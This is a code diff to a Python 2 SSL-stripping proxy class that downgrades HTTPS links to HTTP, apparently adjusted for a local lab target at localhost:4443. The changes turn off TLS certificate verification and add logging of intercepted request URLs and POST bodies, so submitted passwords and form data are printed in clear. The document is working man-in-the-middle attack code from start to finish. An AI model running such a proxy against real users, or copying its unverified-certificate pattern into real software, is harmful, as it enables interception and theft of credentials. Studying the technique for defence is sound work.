@@ -6,13 +6,16 @@ import urllib2
 class SSLStripProxy(BaseHTTPServer.BaseHTTPRequestHandler):
     def do_GET(self):
         target_host = self.headers.get('Host')
-        url = 'https://{}{}'.format(target_host, self.path)
+        url = 'https://localhost:4443' + self.path
+
+        print("Intercepted GET request %s" % (url))
 
         try:
             req = urllib2.Request(url)
             for k in self.headers:
                 req.add_header(k, self.headers[k])
-            response = urllib2.urlopen(req)
+            context = ssl._create_unverified_context()
+            response = urllib2.urlopen(req, context=context)
             content = response.read()
 
             # Rewrite links from https to http
@@ -26,15 +29,18 @@ class SSLStripProxy(BaseHTTPServer.BaseHTTPRequestHandler):
 
     def do_POST(self):
         target_host = self.headers.get('Host')
-        url = 'https://{}{}'.format(target_host, self.path)
+        url = 'https://localhost:4443' + self.path
         content_length = int(self.headers.get('Content-Length', 0))
         post_data = self.rfile.read(content_length)
+
+        print("Intercepted POST request %s: %s" % (url, post_data))
 
         try:
             req = urllib2.Request(url, data=post_data)
             for k in self.headers:
                 req.add_header(k, self.headers[k])
-            response = urllib2.urlopen(req)
+            context = ssl._create_unverified_context()
+            response = urllib2.urlopen(req, context=context)
             content = response.read()
 
             # Rewrite links again
